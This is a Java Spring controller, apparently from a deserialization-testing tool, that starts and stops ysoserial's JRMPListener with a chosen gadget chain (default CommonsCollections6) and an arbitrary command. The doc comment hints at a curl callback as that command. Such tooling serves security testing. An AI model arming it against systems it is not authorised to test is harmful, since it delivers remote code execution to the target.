package com.oobx.controller;

import com.oobx.chains.YsoserialHandler;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;
import java.util.logging.Logger;

/**
 * Manages a ysoserial JRMPListener subprocess.
 * Used by the JRMP gadget chain test: arm the listener before sending the JRMPClient payload.
 *
 * POST /jrmp/start?port=10099&chain=CommonsCollections6&cmd=<curl ...>
 * POST /jrmp/stop
 * GET  /jrmp/status
 */
@RestController
@RequestMapping("/jrmp")
public class JrmpListenerController {

    private static final Logger log = Logger.getLogger(JrmpListenerController.class.getName());

    private final AtomicReference<Process> activeProcess = new AtomicReference<>();

    @PostMapping("/start")
    public ResponseEntity<Map<String, Object>> start(
            @RequestParam(defaultValue = "10099") int port,
            @RequestParam(defaultValue = "CommonsCollections6") String chain,
            @RequestParam String cmd) {

        stopProcess();

        File ysoJar = YsoserialHandler.findJar("ysoserial");
        if (ysoJar == null) {
            return ResponseEntity.status(500).body(Map.of(
                "error", "ysoserial jar not found in libs/"));
        }

        String java8 = resolveJava8();
        List<String> cmdList = new ArrayList<>();
        cmdList.add(java8);
        cmdList.add("-cp");
        cmdList.add(ysoJar.getAbsolutePath());
        cmdList.add("ysoserial.exploit.JRMPListener");
        cmdList.add(String.valueOf(port));
        cmdList.add(chain);
        cmdList.add(cmd);

        log.info("Starting JRMPListener: " + String.join(" ", cmdList));

        try {
            ProcessBuilder pb = new ProcessBuilder(cmdList);
            pb.redirectErrorStream(false);
            Process proc = pb.start();
            activeProcess.set(proc);

            // Brief delay to let the port bind
            Thread.sleep(700);

            if (!proc.isAlive()) {
                byte[] errBytes = proc.getErrorStream().readAllBytes();
                String err = new String(errBytes);
                log.warning("JRMPListener exited: " + err);
                return ResponseEntity.status(500).body(Map.of(
                    "error", "JRMPListener exited immediately",
                    "stderr", err.substring(0, Math.min(err.length(), 500))));
            }

            log.info("JRMPListener running on port " + port + " chain=" + chain);
            return ResponseEntity.ok(Map.of(
                "port", port, "chain", chain, "cmd", cmd, "status", "running"));

        } catch (Exception e) {
            log.warning("JRMPListener start error: " + e);
            return ResponseEntity.status(500).body(Map.of("error", e.getMessage()));
        }
    }

    @PostMapping("/stop")
    public Map<String, Object> stop() {
        boolean stopped = stopProcess();
        return Map.of("status", stopped ? "stopped" : "not_running");
    }

    @GetMapping("/status")
    public Map<String, Object> status() {
        Process proc = activeProcess.get();
        boolean running = proc != null && proc.isAlive();
        return Map.of("running", running);
    }

    private boolean stopProcess() {
        Process proc = activeProcess.getAndSet(null);
        if (proc != null) {
            if (proc.isAlive()) {
                proc.destroyForcibly();
                log.info("JRMPListener stopped");
            }
            return true;
        }
        return false;
    }

    private static String resolveJava8() {
        String[] candidates = {
            "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
            "/usr/lib/jvm/java-8-openjdk/bin/java",
        };
        for (String p : candidates) {
            if (new File(p).exists()) return p;
        }
        return "java";
    }
}
